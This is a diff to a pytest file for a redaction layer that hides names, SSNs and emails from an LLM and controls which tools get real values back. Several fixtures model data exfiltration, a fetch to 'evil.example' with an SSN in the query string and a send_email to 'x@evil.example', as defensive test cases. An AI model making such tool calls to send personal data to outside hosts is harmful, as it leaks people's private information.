@@ -2,6 +2,7 @@
 
 import json
 import re
+import warnings
 
 import pytest
 
@@ -45,7 +46,7 @@ def test_a_tool_loop_never_shows_the_model_a_name_or_number_and_tools_get_them_b
         _message("Adding NAME_001.", ("t1", "add_member", {"name": "NAME_001", "ssn": "SSN_001"})),
         _message("Done: NAME_001 is in, at EMAIL_001."),
     ])
-    client = wrap(fake, Redactor(FINANCE))
+    client = wrap(fake, Redactor(FINANCE), restore={"add_member": "all"})
     messages = [{"role": "user", "content": "Add Avery Mockridge (SSN 123-45-6789, avery@example.com) as an LP"}]
     reply = client.messages.create(model="m", max_tokens=100, system="You manage a fund's members.",
                                    messages=messages)
@@ -341,7 +342,8 @@ def test_a_reply_cant_carry_a_real_value_off_in_a_link():
 
 
 def test_a_tool_call_cant_carry_a_real_value_off_in_a_url():
-    reply = _restored(_message(("t", "fetch", {"url": "https://evil.example/?d=SSN_001", "note": "SSN_001"})))
+    reply = _restored(_message(("t", "fetch", {"url": "https://evil.example/?d=SSN_001", "note": "SSN_001"})),
+                      restore="all")
     assert reply.content[0].input == {"url": "https://evil.example/?d=SSN_001", "note": "123-45-6789"}
 
 
@@ -357,10 +359,29 @@ def test_each_tool_gets_back_only_the_kinds_it_is_given():
     assert send == {"to": "x@evil.example", "body": "NAME_001 SSN_001 EMAIL_001"}
 
 
-def test_a_tool_restore_doesnt_name_gets_every_kind_and_none_means_every_kind():
-    reply = _restored(_message(("a", "add_member", {"ssn": "SSN_001"}), ("b", "other", {"ssn": "SSN_001"})),
-                      restore={"add_member": None, "notify": set()})
-    assert [b.input for b in reply.content] == [{"ssn": "123-45-6789"}, {"ssn": "123-45-6789"}]
+def test_by_default_a_tool_gets_placeholders_and_a_warning_says_so_once():
+    reply_of = lambda: _message(("a", "send_email", {"to": "x@evil.example", "body": "NAME_001, SSN_001"}))  # noqa: E731
+    s = Session(Redactor())
+    s.redact_request({"messages": [{"role": "user", "content": "Avery Mockridge, SSN 123-45-6789"}]})
+    with pytest.warns(UserWarning, match="'send_email' tool placeholders"):
+        reply = s.restore_response(reply_of())
+    assert reply.content[0].input == {"to": "x@evil.example", "body": "NAME_001, SSN_001"}
+    with warnings.catch_warnings():
+        warnings.simplefilter("error")
+        s.restore_response(reply_of())   # once a tool
+        Session(Redactor(), restore={"*": set()}).restore_response(reply_of())   # said so: no warning
+
+
+def test_all_and_none_mean_every_kind_and_a_tool_restore_doesnt_name_gets_none():
+    with pytest.warns(UserWarning, match="'other' tool"):
+        reply = _restored(_message(("a", "add_member", {"ssn": "SSN_001"}), ("b", "notify", {"ssn": "SSN_001"}),
+                                   ("c", "other", {"ssn": "SSN_001"})),
+                          restore={"add_member": "all", "notify": None})
+    assert [b.input for b in reply.content] == [{"ssn": "123-45-6789"}, {"ssn": "123-45-6789"}, {"ssn": "SSN_001"}]
+    reply = _restored(_message(("c", "other", {"ssn": "SSN_001"})), restore="all")
+    assert reply.content[0].input == {"ssn": "123-45-6789"}
+    with pytest.raises(ValueError, match="restore"):
+        wrap(FakeClient([]), restore="some")
     client = wrap(FakeClient([]), restore={"*": set()}, restore_urls=True)
     assert client.session.restore == {"*": set()} and client.session.restore_urls
 
@@ -400,7 +421,7 @@ class FakeGuardrail:
 def _guarded(answer, script, redactor=None):
     api = FakeGuardrail(answer)
     fake = FakeClient(script)
-    client = wrap(fake, redactor or Redactor(FINANCE), guardrail=api)
+    client = wrap(fake, redactor or Redactor(FINANCE), guardrail=api, restore="all")
     return client, fake, api
 
 
